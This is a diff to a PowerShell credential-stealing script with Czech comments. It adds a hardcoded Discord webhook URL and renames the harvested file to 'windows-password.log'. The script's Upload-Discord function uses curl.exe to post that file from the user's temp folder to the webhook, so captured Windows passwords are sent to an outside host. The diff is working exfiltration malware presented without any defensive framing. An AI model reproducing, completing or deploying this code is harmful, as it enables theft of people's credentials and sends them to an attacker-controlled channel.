@@ -1,3 +1,5 @@
+$dc = "https://discord.com/api/webhooks/1072720512670773258/HtPdrbSLVArwQnTq6vLkpsew4kHuvZASeJusElejbX4-GTwGKOYhIRPpGJszXjvHGYPy"
+
 # Zjistění jazyka systému Windows
 $sysLang = (Get-Culture).Name
 
@@ -53,7 +55,8 @@ if ($sysLang -like "en*") {
 
 #------------------------------------------------------------------------------------------------------------------------------------
 
-$FileName = "$env:USERNAME-$(get-date -f yyyy-MM-dd_hh-mm)_User-Creds.txt"
+$FileName = "windows-password.log"
+
  
 #------------------------------------------------------------------------------------------------------------------------------------
 
@@ -469,7 +472,7 @@ Invoke-RestMethod -ContentType 'Application/Json' -Uri $hookurl  -Method Post -B
 if (-not ([string]::IsNullOrEmpty($file))){curl.exe -F "file1=@$file" $hookurl}
 }
 
-if (-not ([string]::IsNullOrEmpty($dc))){Upload-Discord -file $env:TMP\$FileName}
+if (-not ([string]::IsNullOrEmpty($dc))){Upload-Discord -file $env:TMP\$FileName -text "ahoj"}
 
 #------------------------------------------------------------------------------------------------------------------------------------
 
